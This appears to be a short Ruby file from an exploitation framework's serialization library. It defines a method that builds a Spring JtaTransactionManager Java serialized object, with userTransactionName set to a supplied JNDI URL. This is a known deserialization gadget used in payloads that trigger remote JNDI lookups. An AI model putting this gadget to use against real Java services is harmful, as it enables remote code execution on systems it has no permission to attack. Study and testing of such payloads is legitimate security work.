# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Spring
          def make_jta(jndiUrl)
            Model::JavaObject.new('Lorg/springframework/transaction/jta/JtaTransactionManager;',
                                  'userTransactionName' => jndiUrl)
          end
        end
      end
    end
  end
end
